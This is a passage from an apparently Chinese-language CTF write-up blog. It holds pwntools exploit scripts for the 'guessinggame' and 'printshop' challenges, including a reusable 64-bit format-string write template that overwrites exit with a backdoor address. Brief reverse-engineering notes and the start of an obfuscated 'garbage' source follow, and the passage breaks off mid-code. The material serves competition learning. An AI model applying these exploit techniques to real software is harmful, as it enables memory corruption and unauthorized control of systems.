class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./guessinggame&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&#x27;Input&#x27;</span>)</span><br><span class="line">    payload = (<span class="number">0x130</span> - <span class="number">0x4</span>) * <span class="string">&#x27;a&#x27;</span> + p32(<span class="number">1</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h2 id="printshop"><a href="#printshop" class="headerlink" title="printshop"></a>printshop</h2><p>简单的格式化字符串，只需要把exit改为后门函数地址即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./printshop&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;chal.pctf.competitivecyber.club&quot;</span>, <span class="number">7997</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./printshop&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">format_string_template_64</span>(<span class="params">location_arg,target,after_change,len_other_string = <span class="number">0</span>,ljust_location = <span class="number">0x50</span>,bit = <span class="number">0x6</span></span>):</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">1</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line"></span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">2</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">3</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">		low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">	</span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">	</span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">		location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">4</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">		low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">		low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">	</span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">	</span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">		location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">		location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">5</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">		low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">		low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">		low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">	</span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">	</span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">		location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">		location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">		location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> bit == <span class="number">6</span>:</span><br><span class="line">		low1 = (after_change &amp; <span class="number">0xff</span>)</span><br><span class="line">		low2 = (after_change &amp; <span class="number">0xff00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line">		low3 = (after_change &amp; <span class="number">0xff0000</span>) &gt;&gt; <span class="number">16</span></span><br><span class="line">		low4 = (after_change &amp; <span class="number">0xff000000</span>) &gt;&gt; <span class="number">24</span></span><br><span class="line">		low5 = (after_change &amp; <span class="number">0xff00000000</span>) &gt;&gt; <span class="number">32</span></span><br><span class="line">		low6 = (after_change &amp; <span class="number">0xff0000000000</span>) &gt;&gt; <span class="number">40</span></span><br><span class="line">	</span><br><span class="line">		c1 = (low1 - len_other_string + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c2 = (low2 - low1 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c3 = (low3 - low2 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c4 = (low4 - low3 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c5 = (low5 - low4 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">		c6 = (low6 - low5 + <span class="number">0x100</span>) % <span class="number">0x100</span></span><br><span class="line">	</span><br><span class="line">		location_arg1 = location_arg + ljust_location / <span class="number">0x8</span></span><br><span class="line">		location_arg2 = location_arg1 + <span class="number">1</span></span><br><span class="line">		location_arg3 = location_arg2 + <span class="number">1</span></span><br><span class="line">		location_arg4 = location_arg3 + <span class="number">1</span></span><br><span class="line">		location_arg5 = location_arg4 + <span class="number">1</span></span><br><span class="line">		location_arg6 = location_arg5 + <span class="number">1</span></span><br><span class="line">	</span><br><span class="line">		payload = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c1) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg1) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c2) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg2) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c3) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg3) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c4) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg4) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c5) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg5) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(c6) + <span class="string">&#x27;c&#x27;</span> + <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(location_arg6) + <span class="string">&#x27;$hhn&#x27;</span></span><br><span class="line">		payload = payload.ljust(ljust_location,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">		payload = payload + p64(target)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x1</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x2</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x3</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x4</span>)</span><br><span class="line">		payload = payload + p64(target + <span class="number">0x5</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    backdoor = <span class="number">0x40129D</span></span><br><span class="line">    dbg()</span><br><span class="line">    payload = format_string_template_64(<span class="number">6</span>, <span class="number">0x404060</span>, backdoor, <span class="number">0</span>, <span class="number">0x50</span>, <span class="number">3</span>)</span><br><span class="line">    ru(<span class="string">&#x27; &gt;&gt;&#x27;</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Coffee-Shop"><a href="#Coffee-Shop" class="headerlink" title="Coffee Shop"></a>Coffee Shop</h2><p>jadx一拖就出来了，简单的base64</p>
<p><img src="https://s2.loli.net/2023/09/11/aM9xRubKt2vS1Qi.png" alt=""></p>
<h2 id="Patchwork"><a href="#Patchwork" class="headerlink" title="Patchwork"></a>Patchwork</h2><p>题目说程序的执行流有问题</p>
<p>懒得逆向，直接在gdb里跳转到目标函数（</p>
<p><img src="https://s2.loli.net/2023/09/11/oExOLZqhjVRzYdQ.png" alt=""></p>
<p><img src="https://s2.loli.net/2023/09/11/tmTYgnH24Swvza7.png" alt=""></p>
<h2 id="garbage"><a href="#garbage" class="headerlink" title="garbage"></a>garbage</h2><p>给了源代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++.++++.+++.-.+++.++.&lt;&lt;++.&gt;&gt;-.+.--.---------.+++++.-------.</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> * <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++++++++.---.--.&lt;&lt;++.&gt;&gt;+++++.-----------------.+++++++++++++.----------.+++++++++++.--.&lt;&lt;.&gt;&gt;----.++++.+++.-.+++.++.&lt;&lt;.++++++++++.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finalstage</span>(<span class="params">w</span>):</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+.&lt;&lt;++.&gt;&gt;.+++.+++++.-------------.+++++++++++.+++++++.+.-------------------.++++++.--.&lt;&lt;++++++++.&gt;&gt;++++++++++++++++++.&lt;&lt;+.&gt;------------.</span></span><br><span class="line">    h=<span class="number">0</span> <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++.&lt;---------.-------------.</span></span><br><span class="line">    w = <span class="built_in">list</span>(w) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.&gt;&gt;-----------.---.++++++++++.+.&lt;&lt;++++++++.&gt;&gt;+++.&lt;&lt;+.</span></span><br><span class="line">    w.reverse() <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.&lt;&lt;++++++++++++++++.&gt;&gt;-----.-------------.+++++++++++++++++.-----------------.+++++++++++++.+.--------------.&lt;&lt;------.+.</span></span><br><span class="line">    w = <span class="string">&quot;&quot;</span>.join(g <span class="keyword">for</span> g <span class="keyword">in</span> w) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.&lt;&lt;++.&gt;---------.&lt;.++..++++++++++++.&gt;&gt;-------------.+++++.------.+++++.&lt;&lt;------.&gt;&gt;-------.&lt;&lt;--------.&gt;&gt;-.+++++++++.+++.&lt;&lt;.&gt;&gt;-----------.&lt;&lt;.&gt;&gt;++.+++++.&lt;&lt;.&gt;&gt;+++++++++.&lt;&lt;+++++++++.</span></span><br><span class="line">    flag = <span class="string">&#x27;flag&#x27;</span>.replace(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;galf&#x27;</span>).replace(<span class="string">&#x27;galf&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++.++++++.-----------.++++++.&lt;&lt;++.&gt;---------.&lt;.+++++++.&gt;&gt;-.++++++.-----------.++++++.&lt;&lt;.+++++++.&gt;&gt;+++++++++++.-------------.+++++++++++.----.-----------.++.++.&lt;&lt;------.-.&gt;&gt;+.++++++.-----------.++++++.&lt;&lt;.+++++.------------.+++++++.&gt;&gt;.------.+++++++++++.------.&lt;&lt;.++.+++++.&gt;&gt;++++++++++++.-------------.+++++++++++.----.-----------.++.++.&lt;&lt;------.-.&gt;&gt;++.------.+++++++++++.------.&lt;&lt;.+++++.------------.+++++++..++.</span></span><br><span class="line">    <span class="keyword">while</span> h &lt; <span class="built_in">len</span>(w): <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++++.---------------.+.+++.-------.&lt;&lt;++.&gt;&gt;+++.&lt;&lt;.&gt;----------.&lt;.&gt;&gt;++++.-------.+++++++++.&lt;&lt;++++++++.&gt;&gt;+++++++++.&lt;&lt;+.&gt;--.</span></span><br><span class="line">        <span class="keyword">try</span>: <span class="comment"># ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++++++.--.+++++++.&lt;------------.</span></span><br><span class="line">            flag += w[h+<span class="number">1</span>] + w[h] <span class="comment"># 